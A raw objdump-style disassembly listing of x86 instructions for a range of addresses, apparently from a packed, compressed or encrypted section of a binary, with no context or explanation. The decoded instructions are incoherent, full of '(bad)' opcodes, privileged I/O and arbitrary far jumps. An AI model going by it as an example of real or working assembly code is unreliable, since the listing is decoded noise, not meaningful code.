  417d4c:	in     eax,dx
  417d4d:	in     eax,dx
  417d4e:	cmp    eax,0x5b14a9d7
  417d53:	stos   DWORD PTR es:[edi],eax
  417d54:	cld    
  417d55:	js     0x417d69
  417d57:	xchg   DWORD PTR [ebx+0x28],ecx
  417d5a:	mov    ebp,0xaa6dc071
  417d5f:	cmp    BYTE PTR [eax],bh
  417d61:	mov    bh,0x41
  417d63:	adc    DWORD PTR [ecx+0x2],ecx
  417d66:	jl     0x417d3d
  417d68:	int    0xc
  417d6a:	inc    eax
  417d6b:	xor    edi,DWORD PTR [edx+0x68feec74]
  417d71:	lea    eax,[edx-0x63]
  417d74:	jno    0x417d8a
  417d76:	inc    esp
  417d77:	cs jp  0x417db5
  417d7a:	shl    bh,cl
  417d7c:	daa    
  417d7d:	sub    al,BYTE PTR [ecx-0x3d3650e6]
  417d83:	dec    edx
  417d84:	ja     0x417dd9
  417d86:	xchg   edx,eax
  417d87:	inc    edx
  417d88:	xchg   ecx,eax
  417d89:	mov    ds:0x6c79ae20,eax
  417d8e:	adc    ebp,eax
  417d90:	pop    ebp
  417d91:	mov    bh,0x35
  417d93:	ret    0x32aa
  417d96:	mov    al,0xb8
  417d98:	cmp    eax,0x82ee9eeb
  417d9d:	push   es
  417d9e:	in     al,dx
  417d9f:	sbb    BYTE PTR [eax],al
  417da1:	adc    edx,ebx
  417da3:	das    
  417da4:	add    eax,0x63914b5e
  417da9:	(bad)  
  417daa:	daa    
  417dab:	or     DWORD PTR [esi+0x1c554a17],ebx
  417db1:	not    BYTE PTR [esi+0x2e44ce32]
  417db7:	pop    edi
  417db8:	lea    ecx,[esi+0x4200f55d]
  417dbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dbf:	out    dx,al
  417dc0:	xor    eax,0x0
	...
  417e31:	add    BYTE PTR [eax],al
  417e33:	add    BYTE PTR [edi-0x519271e7],bh
  417e39:	(bad)  
  417e3a:	(bad)  
  417e3b:	(bad)  
  417e3d:	xlat   BYTE PTR ds:[ebx]
  417e3e:	aam    0xef
  417e40:	jg     0x417e81
  417e42:	fwait
  417e43:	cmp    ch,BYTE PTR [esp+eax*1]
  417e46:	add    DWORD PTR [eax],eax
  417e48:	cmc    
  417e49:	add    BYTE PTR [eax],al
  417e4b:	add    BYTE PTR [ebx+0x15e913d1],bl
  417e51:	stos   DWORD PTR es:[edi],eax
  417e52:	ds inc edi
  417e54:	push   0xc1f8b42c
  417e59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e5a:	xchg   DWORD PTR [eax+eax*4+0x71],eax
  417e5e:	mov    bl,0xfb
  417e60:	sbb    ch,BYTE PTR [ebx-0x6f]
  417e63:	es mov esp,0x906e8475
  417e69:	(bad)  
  417e6a:	sti    
  417e6b:	(bad)  
  417e6c:	call   0xdd8a:0xbe29bcdf
  417e73:	mov    ah,0x53
  417e75:	push   ss
  417e76:	xor    ebx,ecx
  417e78:	in     al,0x8
  417e7a:	jp     0x417eeb
  417e7c:	mov    edx,0x7398fe51
  417e81:	mov    bh,BYTE PTR [edx-0x2254adcd]
  417e87:	sahf   
  417e88:	ja     0x417f03
  417e8a:	xchg   ecx,eax
  417e8b:	add    BYTE PTR [edx],dl
  417e8d:	(bad)  
  417e8e:	stc    
  417e8f:	mov    eax,ds:0x70037987
  417e94:	aam    0xaf
  417e96:	xor    ah,BYTE PTR [ebp+0x5fc28b1a]
  417e9c:	fldenv [eax+0x3d591ba2]
  417ea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ea3:	xchg   ecx,eax
  417ea4:	adc    eax,0xd4d6118a
  417ea9:	cdq    
  417eaa:	(bad)  
  417eab:	jle    0x417f08
  417ead:	jb     0x417f14
  417eaf:	push   edx
  417eb0:	and    dh,al
  417eb2:	shl    DWORD PTR [ecx-0x4a],1
  417eb5:	sbb    eax,0xed43cc69
  417eba:	sbb    al,BYTE PTR [ecx-0x6a9b6d05]
  417ec0:	push   0x60f4f0af
  417ec5:	hlt    
  417ec6:	test   al,0x18
  417ec8:	rcr    dl,0x9a
  417ecb:	mov    eax,0x19729dc7
  417ed0:	inc    eax
  417ed1:	jmp    0x417eda
  417ed3:	(bad)  
  417ed4:	leave  
  417ed5:	bound  edi,QWORD PTR [ebx+edx*1-0x5487eb71]
  417edc:	ins    BYTE PTR es:[edi],dx
  417edd:	(bad)  
  417ede:	xor    edi,DWORD PTR [ebx-0x2f0f5d13]
  417ee4:	out    0xe3,eax
  417ee6:	das    
  417ee7:	fwait
  417ee8:	push   0xffffffd2
  417eea:	inc    edx
  417eeb:	cmp    eax,0x4b7dcc28
  417ef0:	jle    0x417f13
  417ef2:	scas   al,BYTE PTR es:[edi]
  417ef3:	cli    
  417ef4:	in     eax,dx
  417ef5:	loopne 0x417f6f
  417ef7:	jg     0x417f2b
  417ef9:	cli    
  417efa:	hlt    
  417efb:	and    cl,BYTE PTR [eax+0x543774cd]
  417f01:	icebp  
  417f02:	arpl   WORD PTR [ecx+0x2e],bp
  417f05:	int3   
  417f06:	push   0x834d3a8a
  417f0b:	(bad)  
  417f0c:	loopne 0x417f1c
  417f0e:	outs   dx,DWORD PTR ds:[esi]
  417f0f:	imul   eax,eax,0xffffffc5
  417f12:	push   edx
  417f13:	fmul   DWORD PTR [ebx+0x15d88792]
  417f19:	cmp    dl,bh
  417f1b:	push   ecx
  417f1c:	and    eax,0x4fa2cdf1
  417f21:	jb     0x417f81
  417f23:	mov    al,0xe9
  417f25:	jmp    0x417f27
  417f27:	mov    ch,0xe1
  417f29:	lea    edx,[esi]
  417f2b:	jl     0x417f8c
  417f2d:	jl     0x417f75
  417f2f:	stos   BYTE PTR es:[edi],al
  417f30:	mov    bl,0x4f
  417f32:	(bad)  
  417f33:	es enter 0xca75,0xa4
  417f38:	sub    al,0xe7
  417f3a:	sbb    BYTE PTR [ebx],cl
  417f3c:	mov    dh,0x84
  417f3e:	add    dh,ah
  417f40:	push   edx
	...
  417fb1:	add    BYTE PTR [eax],al
  417fb3:	add    BYTE PTR [esi+0x2d],dh
  417fb6:	push   ebp
  417fb7:	inc    ecx
  417fb8:	pop    edi
  417fb9:	jns    0x418031
  417fbb:	aas    
  417fbc:	fisttp DWORD PTR [esi-0x68]
  417fbf:	inc    edx
  417fc0:	push   edx
  417fc1:	test   dl,al
  417fc3:	xor    al,0x21
  417fc5:	add    eax,0xf50001
  417fca:	add    BYTE PTR [eax],al
  417fcc:	add    eax,0x3d416a50
  417fd1:	and    eax,0x64cdfde5
  417fd6:	aad    0xb5
  417fd8:	adc    ebx,ebx
  417fda:	and    edi,eax
  417fdc:	ja     0x417fa5
  417fde:	cdq    
  417fdf:	push   ss
  417fe0:	dec    esp
  417fe1:	mov    eax,0x907363fb
  417fe6:	mov    cl,bl
  417fe8:	sub    esi,DWORD PTR [eax]
  417fea:	dec    eax
  417feb:	adc    ebp,DWORD PTR [edx+0x59f9c0d4]
  417ff1:	pop    ds
  417ff2:	mov    dl,0x6a
  417ff4:	daa    
  417ff5:	into   
  417ff6:	mov    ebx,edx
  417ff8:	clc    
  417ff9:	mov    cl,0x79
  417ffb:	hlt    
  417ffc:	dec    ebx
  417ffd:	push   ds
  417ffe:	hlt    
  417fff:	and    edi,DWORD PTR [ebx]
  418001:	inc    edi
  418002:	pop    eax
  418003:	pop    edi
  418004:	in     al,dx
  418005:	loopne 0x417feb
  418007:	out    0xf7,al
  418009:	arpl   WORD PTR [edx+0x16],cx
  41800c:	call   0x38bf:0xb4839c7b
  418013:	adc    al,0x4c
  418015:	test   BYTE PTR [ebx-0x7bdfa732],bl
  41801b:	add    BYTE PTR [eax-0x3a],bh
  41801e:	xchg   edi,eax
  41801f:	xchg   edx,eax
  418020:	cmc    
  418021:	push   edi
  418022:	mov    cl,0xa5
  418024:	push   0xd094119
  418029:	(bad)  
  41802a:	sbb    DWORD PTR [edx-0x63],esp
  41802d:	xor    al,0xad
  41802f:	or     bh,BYTE PTR [esi+edx*4-0xd]
  418033:	cmp    al,0xf3
  418035:	cmp    ecx,ebp
  418037:	shl    BYTE PTR [ebp+0x15],1
  41803a:	ja     0x4180ab
  41803c:	add    ah,BYTE PTR [eax]
  41803e:	push   ebp
  41803f:	bound  edi,QWORD PTR [edx]
  418041:	dec    ebx
  418042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418043:	aam    0x62
  418045:	test   BYTE PTR [eax],bh
  418047:	inc    eax
  418048:	dec    ecx
  418049:	sbb    DWORD PTR [esi],edx
  41804b:	fbld   TBYTE PTR [eax]
  41804d:	in     eax,dx
  41804e:	pop    edx
  41804f:	xor    BYTE PTR [ecx+eax*8+0x42],bh
  418053:	(bad)  
  418054:	and    BYTE PTR [esi+0x68b71bc3],ah
  41805a:	xor    bl,BYTE PTR [edi]
  41805c:	dec    esi
  41805d:	adc    ch,bl
  41805f:	xor    bl,ah
  418061:	retf   0x222a
  418064:	xchg   ebx,eax
  418065:	rol    BYTE PTR [eax-0x69],cl
  418068:	adc    dl,bh
  41806a:	xor    BYTE PTR [edi+0x31],0xba
  41806e:	push   ebx
  41806f:	cld    
  418070:	mov    ah,0x59
  418072:	test   DWORD PTR [eax],0x9d052e60
  418078:	pop    ebx
  418079:	cmp    ebx,edx
  41807b:	pop    edi
  41807c:	dec    ebp
  41807d:	push   esi
  41807e:	push   eax
  41807f:	mov    ah,0x88
  418081:	les    esi,FWORD PTR [ebx]
  418083:	fcmove st,st(2)
  418085:	fwait
  418086:	jmp    0x2c46:0x2c32d1e9
  41808d:	mov    bh,0x60
  41808f:	cmp    BYTE PTR [ebx+0x429d9aec],dl
  418095:	mov    edi,0x968b5b30
  41809a:	cmp    BYTE PTR [ecx+0x446df3f0],dh
  4180a0:	pop    edx
  4180a1:	sti    
  4180a2:	enter  0x7575,0x25
  4180a6:	cli    
  4180a7:	dec    edi
  4180a8:	mov    esi,0x847dece8
  4180ad:	cmp    BYTE PTR [eax],cl
  4180af:	std    
  4180b0:	arpl   WORD PTR [edx+eax*1+0x2a],bx
  4180b4:	adc    esp,DWORD PTR [edx-0x68383f41]
  4180ba:	dec    edx
  4180bb:	xchg   ebp,eax
  4180bc:	xchg   ecx,eax
  4180bd:	mov    edx,0x183482
	...
  418132:	add    BYTE PTR [eax],al
  418134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418135:	sbb    DWORD PTR [eax+0x1a],esi
  418138:	(bad)  
  418139:	jnp    0x418129
  41813b:	mov    ebp,0xe8ea9e45
  418140:	dec    esp
  418141:	add    bh,BYTE PTR [eiz*8+0x10616]
  418148:	cmc    
  418149:	add    BYTE PTR [eax],al
  41814b:	add    BYTE PTR [ecx+ebp*4-0x70],bh
  41814f:	repz push 0x32
  418152:	xchg   esi,eax
  418153:	fdivr  QWORD PTR ds:0xf83d7f9b
  418159:	xor    eax,0xe0fa1c9c
  41815e:	sbb    al,0x86
  418160:	sbb    ecx,DWORD PTR [eax]
  418162:	mov    WORD PTR [eax+0x7e0e9619],fs
  418168:	add    DWORD PTR [ebp-0x2d086a33],0xffffffac
  41816f:	and    ebx,esi
  418171:	arpl   WORD PTR [ecx-0x54],bx
  418174:	es je  0x418192
  418177:	sub    eax,0xd58c2418
  41817c:	or     ah,cl
  41817e:	inc    esi
  41817f:	dec    ecx
  418180:	inc    ecx
  418181:	sar    DWORD PTR [edi+eiz*8],cl
  418184:	addr16 iret 
  418186:	(bad)  
  418187:	aam    0xdc
  418189:	es cmp eax,0x61d6540
  41818f:	push   es
  418190:	shl    DWORD PTR [esi+0x573cd244],1
  418196:	fwait
  418197:	and    eax,0x75eb6acb
  41819c:	retf   
  41819d:	inc    ecx
  41819e:	cld    
  41819f:	add    ebx,DWORD PTR [edx+edi*8+0x4f02d142]
  4181a6:	inc    esi
  4181a7:	jo     0x41815d
  4181a9:	and    eax,0x9c727933
  4181ae:	popa   
  4181af:	pop    ecx
  4181b0:	call   0x212e954b
  4181b5:	sub    ecx,DWORD PTR [ebp+0x7242b4fd]
  4181bb:	push   ecx
  4181bc:	sbb    bl,dh
  4181be:	pop    edi
  4181bf:	push   edi
  4181c0:	popa   
  4181c1:	push   cs
  4181c2:	fwait
  4181c3:	add    DWORD PTR [ebp-0x6],0x5b
  4181c7:	mov    dh,BYTE PTR [edi-0x1f]
  4181ca:	not    DWORD PTR [ecx-0x44df6d38]
  4181d0:	add    dl,BYTE PTR [eax+0xc]
  4181d3:	ins    BYTE PTR es:[edi],dx
  4181d4:	fdivr  QWORD PTR [ebx+0xd18144d]
  4181da:	xchg   ebx,eax
  4181db:	(bad)  
  4181dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181dd:	mov    WORD PTR [edx-0x80],ss
  4181e0:	imul   ecx,DWORD PTR [ecx],0xffffffeb
  4181e3:	jle    0x4181f3
  4181e5:	push   ebp
  4181e6:	mov    eax,ds:0xd6c211c4
  4181eb:	(bad)  
  4181ec:	(bad)  
  4181ed:	aam    0x9f
  4181ef:	mov    BYTE PTR [edx+edx*4-0x4a2ac066],cl
  4181f6:	dec    ebx
  4181f7:	es int3 
  4181f9:	fcom   DWORD PTR gs:[ecx]
  4181fc:	std    
  4181fd:	cmc    
  4181fe:	stos   BYTE PTR es:[edi],al
  4181ff:	sbb    bh,BYTE PTR [si-0x7156]
  418204:	fmul   DWORD PTR [edx+0xfbfdf73]
  41820a:	mov    al,ds:0x28203610
  41820f:	ja     0x4181db
  418211:	or     edi,DWORD PTR [edi]
  418213:	inc    ebx
  418214:	mov    ?,WORD PTR [ebp-0x585e7750]
  41821a:	xchg   BYTE PTR [edx+0x79],al
  41821d:	aaa    
  41821e:	push   ebx
  41821f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418220:	popa   
  418221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418222:	stos   DWORD PTR es:[edi],eax
  418223:	fist   DWORD PTR [edi]
  418225:	pop    edx
  418226:	or     ah,bh
  418228:	ja     0x418256
  41822a:	and    BYTE PTR [esi-0x1e],dh
  41822d:	sbb    BYTE PTR [eax],bh
  41822f:	imul   BYTE PTR [eax-0x7e896f3d]
  418235:	daa    
  418236:	mov    bh,0xb4
  418238:	add    ah,BYTE PTR [esi+0x112aff0c]
  41823e:	les    ecx,FWORD PTR [edi+0x49]
	...
  4182b1:	add    BYTE PTR [eax],al
  4182b3:	add    BYTE PTR [ecx-0x44],ch
  4182b6:	xlat   BYTE PTR ds:[ebx]
  4182b7:	pop    esi
  4182b8:	xlat   BYTE PTR ds:[ebx]
  4182b9:	jg     0x4182a4
  4182bb:	mov    edi,0x113ef3ec
  4182c0:	adc    al,0xe5
  4182c2:	push   0x1070b7f
  4182c7:	add    ch,dh
  4182c9:	add    BYTE PTR [eax],al
  4182cb:	add    BYTE PTR [eax-0x6b],dl
  4182ce:	(bad)  
  4182cf:	and    ch,BYTE PTR [edx]
  4182d1:	nop
  4182d2:	push   cs
  4182d3:	ret    
  4182d4:	fcmove st,st(2)
  4182d6:	sub    eax,0xc47d976a
  4182db:	pop    esp
  4182dc:	sbb    BYTE PTR [esi+0x6d],dl
  4182df:	pop    esp
  4182e0:	out    dx,al
  4182e1:	sub    al,0x51
  4182e3:	fmul   QWORD PTR [edx]
  4182e5:	jp     0x41833a
  4182e7:	lods   al,BYTE PTR ds:[esi]
  4182e8:	mov    ds:0x38e6a41,al
  4182ed:	ror    bl,0x9e
  4182f0:	mov    cl,0x2b
  4182f2:	punpckhdq mm4,QWORD PTR [ebp-0x57ae49ef]
  4182f9:	cmp    eax,0x322d58b6
  4182fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182ff:	push   esi
  418300:	ss jne 0x418292
  418303:	data16 lahf 
  418305:	ret    0x3da
  418308:	int3   
  418309:	xchg   esi,eax
  41830a:	jns    0x4182f1
  41830c:	and    ah,BYTE PTR [edi+0x23b261ab]
  418312:	ja     0x41836f
  418314:	sahf   
  418315:	call   0xbaf76c1
  41831a:	pop    ss
  41831b:	ficomp DWORD PTR [edi+0x1a]
  41831e:	adc    BYTE PTR [esi+0x3a],dh
  418321:	cdq    
  418322:	dec    esi
  418323:	cmp    bh,BYTE PTR [ecx+0xa]
  418326:	mov    WORD PTR [eax],ss
  418328:	adc    BYTE PTR [edx-0x723b2d3e],bh
  41832e:	ss je  0x41837c
  418331:	push   ebp
  418332:	push   esp
  418333:	inc    edi
  418334:	sub    cl,al
  418336:	jl     0x418384
  418338:	inc    edi
  418339:	(bad)  
  41833a:	ins    BYTE PTR es:[edi],dx
  41833b:	out    0xbb,al
  41833d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41833e:	mov    ecx,0x3d944be6
  418343:	cmp    dh,BYTE PTR [ebx+0xa]
  418346:	dec    edi
  418347:	pop    ebx
  418348:	loope  0x418329
  41834a:	aam    0xc8
  41834c:	stc    
  41834d:	cs dec ecx
  41834f:	dec    eax
  418350:	adc    eax,0x85ea9214
  418355:	jb     0x41833c
  418357:	imul   ebp,DWORD PTR [edi+0x17],0xb9d8bac0
  41835e:	out    dx,eax
  41835f:	data16 mov bl,0x55
  418362:	dec    edx
  418363:	adc    BYTE PTR [eax+0x1c2aec37],ch
  418369:	xchg   ecx,edx
  41836b:	adc    al,0xa2
  41836d:	stos   BYTE PTR es:[edi],al
  41836e:	jp     0x4183bb
  418370:	in     al,dx
  418371:	pop    ecx
  418372:	push   eax
  418373:	mov    edx,DWORD PTR [esi+0x22]
  418376:	and    ah,BYTE PTR [ebx]
  418378:	xor    esp,DWORD PTR [ecx+edx*1]
  41837b:	adc    dl,BYTE PTR [ecx+edx*1]
  41837e:	add    eax,0x6a08bf84
  418383:	lahf   
  418384:	push   esi
  418385:	adc    ebp,DWORD PTR [edi-0xe]
  418388:	retf   
  418389:	cmp    ch,al
  41838b:	bound  edi,QWORD PTR [edi+edx*2+0x17]
  41838f:	add    dl,BYTE PTR [esi+0x6e]
  418392:	arpl   ax,di
  418394:	lahf   
  418395:	outs   dx,DWORD PTR ds:[esi]
  418396:	mov    edx,0xca4eca03
  41839b:	add    eax,0x2494c9cc
  4183a0:	pusha  
  4183a1:	jg     0x418403
  4183a3:	in     al,dx
  4183a4:	loopne 0x418425
  4183a6:	jmp    0xfa91:0x6d3f2fef
  4183ad:	or     al,0x38
  4183af:	xor    dl,BYTE PTR ds:0x42427110
  4183b5:	inc    esp
  4183b6:	pushf  
  4183b7:	mov    ecx,0xd7eb0bcb
  4183bd:	jo     0x418426
  4183bf:	test   dh,0x0
	...
  418432:	add    BYTE PTR [eax],al
  418434:	xchg   ecx,eax
  418435:	mov    edx,0xdc6b0c6a
  41843a:	idiv   DWORD PTR [edi-0x233270d3]
  418440:	mov    esp,0x82d0b8
  418445:	or     BYTE PTR [ecx],al
  418447:	add    ch,dh
  418449:	add    BYTE PTR [eax],al
  41844b:	add    BYTE PTR [esi],bh
  41844d:	ss cli 
  41844f:	inc    ebx
  418450:	sub    eax,0xecc85fa7
  418455:	lea    esi,[edi+esi*4]
  418458:	pop    ecx
  418459:	out    0xcb,eax
  41845b:	cdq    
  41845c:	nop
  41845d:	jne    0x4184b0
  41845f:	xchg   esi,eax
  418460:	loopne 0x418495
  418462:	js     0x4184b4
  418464:	pop    es
  418465:	je     0x4184e4
  418467:	es out dx,eax
  418469:	or     eax,0x22416efd
  41846e:	out    dx,al
  41846f:	inc    ecx
  418470:	push   0xffffff86
  418472:	iret   
  418473:	imul   ebp,ecx,0xffffffc1
  418476:	aad    0xe0
  418478:	push   0x30
  41847a:	arpl   WORD PTR [edx-0x42],si
  41847d:	add    dl,BYTE PTR [edi+esi*2]
  418480:	ins    DWORD PTR es:[edi],dx
  418481:	ret    0xdcce
  418484:	push   0xfe29ebfd
  418489:	shl    BYTE PTR [ebp-0x5e5e7677],cl
  41848f:	int3   
  418490:	retf   
  418491:	fwait
  418492:	arpl   WORD PTR [ecx],si
  418494:	iret   
  418495:	aam    0x42
  418497:	pop    es
  418498:	cdq    
  418499:	fwait
  41849a:	mov    esp,0x6ee55527
  41849f:	(bad)  
  4184a1:	repnz add edx,DWORD PTR [ebx-0x59cadf4b]
  4184a8:	mov    edi,0xcd2e957f
  4184ad:	popa   
  4184ae:	mov    bl,0xe2
  4184b0:	mov    ecx,0xaa5e467e
  4184b5:	sub    BYTE PTR [ecx-0x6fcb98e8],ah
  4184bb:	push   ds
  4184bc:	retf   0x41c5
  4184bf:	pop    ebp
  4184c0:	inc    ebx
  4184c1:	xor    BYTE PTR ds:0x6e7038c0,bl
  4184c7:	aad    0xd2
  4184c9:	cmp    al,BYTE PTR [ecx-0x46]
  4184cc:	bound  edx,QWORD PTR [ebp+0x12e62583]
  4184d2:	ffreep st(2)
  4184d4:	mov    cl,0x7f
  4184d6:	inc    edx
  4184d7:	pop    edi
  4184d8:	dec    esp
  4184d9:	add    BYTE PTR [edx],cl
  4184db:	mov    ah,0xe7
  4184dd:	xchg   bl,dh
  4184df:	mov    esp,0x23efa78a
  4184e4:	cmp    al,0x74
  4184e6:	stos   BYTE PTR es:[edi],al
  4184e7:	lock xchg dh,dh
  4184ea:	mov    dl,BYTE PTR [esi+0x6f]
  4184ed:	aad    0x2
  4184ef:	add    esi,DWORD PTR [eax]
  4184f1:	xor    esi,DWORD PTR [ebp-0x4d]
  4184f4:	repz dec esi
  4184f6:	ja     0x41848d
  4184f8:	xchg   esi,eax
  4184f9:	outs   dx,DWORD PTR ds:[esi]
  4184fa:	pop    esi
  4184fb:	or     edi,DWORD PTR [edx+0x27457a4e]
  418501:	fwait
  418502:	cmp    dh,BYTE PTR cs:[ecx-0x2e1ccc9c]
  418509:	mov    edi,0x62b34872
  41850e:	cmp    eax,esp
  418510:	mov    dh,0x20
  418512:	ret    0x6f79
  418515:	push   es
  418516:	pop    eax
  418517:	adc    eax,0x54d959a8
  41851c:	sbb    ecx,esi
  41851e:	fsubr  QWORD PTR [ecx+edx*2+0x76]
  418522:	xchg   ebp,eax
  418523:	pop    ss
  418524:	aam    0x8f
  418526:	aad    0x54
  418528:	(bad)  
  418529:	jmp    FWORD PTR [edi+0x2b]
  41852c:	ret    
  41852d:	retf   0x4343
  418530:	push   eax
  418531:	jb     0x4185b1
  418533:	add    eax,0x3122030e
  418538:	in     al,dx
  418539:	push   ebx
  41853a:	dec    edi
  41853b:	enter  0xce,0x84
  41853f:	dec    esi
  418540:	mov    ch,0x0
	...
  4185b2:	add    BYTE PTR [eax],al
  4185b4:	test   eax,0xdf4fd367
  4185b9:	(bad)  
  4185ba:	mov    ebp,0x15c03be7
  4185bf:	stc    
  4185c0:	push   ds
  4185c1:	(bad)
  4185c6:	add    DWORD PTR [eax],eax
  4185c8:	cmc    
  4185c9:	add    BYTE PTR [eax],al
  4185cb:	add    BYTE PTR [edx+0x597d8f9e],ah
  4185d1:	enter  0xb930,0xc7
  4185d5:	dec    ebp
  4185d6:	and    eax,0x21ffdcd
  4185db:	fidivr WORD PTR [ebx-0xd4a95d3]
  4185e1:	fs pop eax
  4185e3:	mov    bl,0xce
  4185e5:	cmp    eax,0x2a2aff05
  4185ea:	mov    ch,ch
  4185ec:	adc    DWORD PTR [ecx-0x75b3f02],edi
  4185f2:	pop    es
  4185f3:	pop    esi
  4185f4:	cmc    
  4185f5:	lods   eax,DWORD PTR ds:[esi]
  4185f6:	in     al,0xe5
  4185f8:	cwde   
  4185f9:	xchg   ebp,eax
  4185fa:	cmp    ah,BYTE PTR [edx]
  4185fc:	lahf   
  4185fd:	sbb    ah,cl
  4185ff:	cmp    eax,0x132c8678
  418604:	(bad)  [esi]
  418606:	dec    esp
  418607:	ins    BYTE PTR es:[edi],dx
  418608:	dec    edx
  418609:	nop
  41860a:	and    dh,BYTE PTR [ebp+0x353857d]
  418610:	pop    ebp
  418611:	dec    esi
  418612:	in     eax,dx
  418613:	imul   ecx,DWORD PTR [ebx],0x2a
  418616:	mov    ecx,0x99892683
  41861b:	pop    edx
  41861c:	out    dx,al
  41861d:	sar    DWORD PTR [edi+0x4a14509d],cl
  418623:	mov    ebp,0xec7d7776
  418628:	fld    DWORD PTR [edx-0x67917c6c]
  41862e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41862f:	in     eax,dx
  418630:	inc    esp
  418631:	imul   ebx,ebx,0xffffffa5
  418634:	mov    ds:0xc649746f,al
  418639:	ret    0xf322
  41863c:	pop    es
  41863d:	push   ds
  41863e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41863f:	mov    eax,DWORD PTR [ecx]
  418641:	xchg   BYTE PTR [edi+0x73],dl
  418644:	(bad)  
  418645:	xor    al,0x1c
  418647:	lock pop ebp
  418649:	outs   dx,BYTE PTR ds:[esi]
  41864a:	fcom   QWORD PTR [ebp+0xd]
  41864d:	in     eax,dx
  41864e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41864f:	push   eax
  418650:	ins    DWORD PTR es:[edi],dx
  418651:	dec    ebx
  418652:	pushf  
  418653:	adc    al,0xac
  418655:	retf   
  418656:	jp     0x418611
  418658:	sbb    dh,bl
  41865a:	sub    BYTE PTR [ebp-0x33994a55],cl
  418660:	pop    eax
  418661:	push   eax
  418662:	sbb    ebp,DWORD PTR [ebx+0x372af245]
  418668:	call   0x560d:0x4806b180
  41866f:	add    eax,0xf064d4b3
  418674:	xchg   esp,eax
  418675:	je     0x41863e
  418677:	cmp    ecx,DWORD PTR [ebx-0x33]
  41867a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41867b:	mov    cl,0x0
  41867d:	and    DWORD PTR [edx+ebp*8-0x22],eax
  418681:	(bad)  
  418682:	dec    edx
  418683:	scas   al,BYTE PTR es:[edi]
  418684:	mov    ebx,0x10e9b809
  418689:	(bad)  
  41868a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41868b:	ret    
  41868c:	stc    
  41868d:	xchg   esp,eax
  41868e:	aaa    
  41868f:	stos   DWORD PTR es:[edi],eax
  418690:	xor    al,0x2b
  418692:	ret    0x8f18
  418695:	xor    DWORD PTR [edx+ebx*8+0x4c24233a],ecx
  41869c:	cli    
  41869d:	xor    al,0xc4
  41869f:	lods   al,BYTE PTR ds:[esi]
  4186a0:	xlat   BYTE PTR ds:[ebx]
  4186a1:	xor    eax,0x3c5c4c5b
  4186a6:	inc    esi
  4186a7:	mov    DWORD PTR [eax],ebp
  4186a9:	mov    dl,0xa2
  4186ab:	and    al,0xd4
  4186ad:	mov    ebp,0xda85e72
  4186b2:	sar    bl,1
  4186b4:	mov    edi,0xc062f694
  4186b9:	imul   eax,eax,0x270f418a
  4186bf:	or     eax,DWORD PTR [eax+eax*1+0x0]
	...
  418733:	add    cl,ch
  418735:	push   cs
  418736:	(bad)  
  418737:	pop    ss
  418738:	push   edi
  41873a:	jmp    0xecc1a73d
  41873f:	sub    ebx,edx
  418741:	mov    al,0x44
  418743:	in     eax,0xea
  418745:	or     DWORD PTR [ecx],eax
  418747:	add    ch,dh
  418749:	add    BYTE PTR [eax],al
  41874b:	add    BYTE PTR [esi-0x33fbf547],bh
  418751:	dec    edx
  418752:	leave  
  418753:	push   ebx
  418754:	xor    dh,BYTE PTR ds:0x7b615016
  41875a:	ins    BYTE PTR es:[edi],dx
  41875b:	and    BYTE PTR [eax+0x3d],0xf4
  41875f:	outs   dx,BYTE PTR ds:[esi]
  418760:	stos   DWORD PTR es:[edi],eax
  418761:	(bad)  [ecx+ecx*2+0x743c2dfe]
  418768:	add    BYTE PTR [eax-0x7a],ah
  41876b:	push   cs
  41876c:	fisttp WORD PTR [ebx-0xa]
  41876f:	repnz push eax
  418771:	dec    esp
  418772:	inc    esp
  418774:	mov    DWORD PTR [ecx+0x26],ebx
  418777:	iret   
  418778:	push   ecx
  418779:	jns    0x41878f
  41877b:	inc    ebx
  41877c:	or     edi,DWORD PTR [ecx+0x66]
  41877f:	sub    al,BYTE PTR [edi]
  418781:	rcr    DWORD PTR [ecx-0x27],cl
  418784:	sub    esp,DWORD PTR [ecx]
  418786:	inc    ecx
  418787:	sub    BYTE PTR [esi+0x7be9931a],dh
  41878d:	mov    edi,0x32872ecb
  418792:	retf   0x2426
  418795:	push   edi
  418796:	lock aad 0x6
  418799:	lahf   
  41879a:	dec    edx
  41879b:	add    eax,0x474420c6
  4187a0:	mov    es,WORD PTR [ebp+0x35]
  4187a3:	xor    BYTE PTR [edx],0x15
  4187a6:	test   al,0x1
  4187a8:	xor    ebx,ebp
  4187aa:	cld    
  4187ab:	push   0x8ec31a65
  4187b0:	fdivr  QWORD PTR [edi]
  4187b2:	hlt    
  4187b3:	and    cl,ah
  4187b5:	loope  0x41873f
  4187b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187b8:	das    
  4187b9:	rcr    ebp,1
  4187bb:	inc    ebx
  4187bc:	add    ebp,ecx
  4187be:	out    0xde,al
  4187c0:	pop    ds
  4187c1:	jg     0x4187e3
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	sti    
  4187c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187c6:	add    dl,al
  4187c8:	clc    
  4187c9:	jns    0x41881e
  4187cb:	popf   
  4187cc:	mov    eax,0x70f85a19
  4187d1:	adc    DWORD PTR [ecx],esp
  4187d3:	jnp    0x418836
  4187d5:	iret   
  4187d6:	ins    BYTE PTR es:[edi],dx
  4187d7:	sub    eax,0xbdb1447d
  4187dc:	repz jo 0x4187a1
  4187df:	hlt    
  4187e0:	add    BYTE PTR [ebp-0x55],al
  4187e3:	mov    dh,0x88
  4187e5:	mov    BYTE PTR [edi+0x78],ah
  4187e8:	lahf   
  4187e9:	push   ds
  4187ea:	cmc    
  4187eb:	jecxz  0x418868
